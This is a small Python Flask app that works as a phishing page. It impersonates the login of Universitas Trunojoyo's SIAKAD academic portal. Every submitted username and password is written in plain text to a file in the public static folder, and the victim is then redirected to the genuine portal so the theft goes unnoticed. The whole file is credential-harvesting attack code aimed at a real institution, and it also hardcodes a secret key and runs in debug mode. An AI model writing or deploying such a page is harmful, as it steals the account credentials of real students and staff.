import os
from flask import Flask, render_template, request, redirect, url_for, abort, session


project_root = os.path.dirname(__file__)
template_path = os.path.join(project_root, 'templates')
static_path = os.path.join(project_root, 'static')


app = Flask(__name__, template_folder=template_path, static_folder=static_path)
app.secret_key = 'ini kunci rahasia'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user = request.form['username']
        passw = request.form['password']
        with open('static/akunsiakad.txt', 'a+') as record:
            text = str('user: ' + user + ' passw: ' + passw +'\n')
            record.write(text)
            record.close()
        return redirect('https://siakad.trunojoyo.ac.id/index.php?pModule=pKLKoNE=&pSub=pKLKoNE=&pAct=qKXSqsjX')
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, use_reloader=True)